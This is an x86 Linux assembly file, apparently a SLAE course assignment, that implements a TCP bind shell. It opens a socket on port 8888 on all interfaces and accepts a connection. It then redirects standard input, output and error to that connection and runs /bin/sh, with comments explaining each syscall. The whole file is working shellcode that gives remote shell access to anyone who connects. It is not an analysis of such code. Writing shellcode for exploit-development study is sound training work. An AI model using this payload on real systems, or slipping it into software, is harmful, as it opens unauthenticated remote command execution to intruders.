; SLAE Assignment 1: TCP Bind Shell
; Student ID: SLAE - 905

global _start			

section .text
_start:
	;;;;;;;;;; Step 1: Create Socket ;;;;;;;;;;
	;; System Call 0x66 "sys_socketcall" => eax is 0x66
	push 0x66
	pop eax
	;; "call" is "sys_socket" (value 0x1) => ebx is 0x1
	push 0x1
	pop ebx
	;; s = socket(AF_INET, SOCK_STREAM, 0) => Push in 0x0, follow by 0x1, and lastly 0x2
	xor ecx,ecx
	push ecx
	push 0x1
	push 0x2
	;; ecx to store pointer to socket args
	mov ecx, esp
	;;call = sys_socket. Returned socket descriptor in eax
	int 0x80

	;;;;;;;;;; Step 2: Bind Socket ;;;;;;;;;;
	;; Store socket descriptor in esi
	mov esi, eax
	;; System Call 0x66 "sys_socketcall" => eax is 0x66
	push 0x66
	pop eax
	;; "call" is "sys_bind" (value 0x2) => ebx is 0x2
	push 0x2
	pop ebx
	;; First, create addr in stack:
	;; addr.sin_family = AF_INET; //value is 2
	;; addr.sin_port = htons(8888); //port to bind to, default is 8888
	;; addr.sin_addr.s_addr = INADDR_ANY; //bind to 0.0.0.0. [INADDR_ANY] = 0
	xor ecx,ecx
	push ecx ; INADDR_ANY which is 0
	push word 0xB822 ; port 8888 in network byte order
	push word 0x2 ; value of AF_INET
	mov ecx, esp ; address to addr stored in ecx
	;; bind(s, (struct sockaddr*)&addr, sizeof(addr)) => Push in sizeof(addr) [which is 16 bytes], then address to addr and then socket descriptor
	push 0x10 ; addr is 16 byes
	push ecx  ; address to addr
	push esi  ; socket descriptor
	;; store pointer to syscall arg to ecx
	mov ecx, esp
	;; call = sys_bind
	int 0x80

	;;;;;;;;;; Step 3: Listen ;;;;;;;;;;
	;; System Call 0x66 "sys_socketcall" => eax is 0x66
	push 0x66
	pop eax
	;; "call" is "sys_listen" (value 0x4) => ebx is 0x4
	push 0x4
	pop ebx
	;; listen(s, 0); => push in 0x0, then socket descriptor
	xor ecx,ecx
	push ecx
	push esi
	;; store pointer to syscall arg to ecx
	mov ecx, esp
	;; call = sys_listen
	int 0x80

	;;;;;;;;;; Step 4: Accept Connections ;;;;;;;;;;
	;; System Call 0x66 "sys_socketcall" => eax is 0x66
	push 0x66
	pop eax
	;; "call" is "sys_accept" (value 0x5) => ebx is 0x5
	push 0x5
	pop ebx
	;; c = accept(s, NULL, NULL); => push 0x0, then 0x0 and lastly socket descriptor
	xor ecx,ecx
	push ecx
	push ecx
	push esi
	;; store pointer to syscall arg to ecx
	mov ecx, esp
	;; call = sys_accept. Returned connection in eax
	int 0x80
	;; Store returned connection to ebx
	xchg ebx, eax
	
	;;;;;;;;;; Step 5: Redirect stdin, stdout and stderr to socket ;;;;;;;;;;
	;; int dup2(int oldfd, int newfd);
	;; set ecx to 2 for stderr, 3rd arg
	push 0x2
	pop ecx
loop:
	;; System Call 0x3F "sys_dup2" => eax is 0x3F
	push 0x3F
	pop eax
	;; ebx is already the connection descriptor
	;; system call sys_dup2
	int 0x80
	dec ecx
	jns loop

	;;;;;;;;;; Step 6: execve Shell ;;;;;;;;;;
	xor edx,edx
	push edx ; push null
	push 0x68732f2f ; "//sh" in reverse order
	push 0x6e69622f ; "/bin" in reverse order
	mov ebx, esp ; ebx store address to "/bin/sh" string
	push edx; push null
	push ebx ; push address of string "/bin/sh" to stack
	mov ecx, esp
	push edx ; push null for envp
	mov edx, esp ; envp
	;; System Call 0xB "execve" => eax is 0xB
	push 0xB
	pop eax
	int 0x80

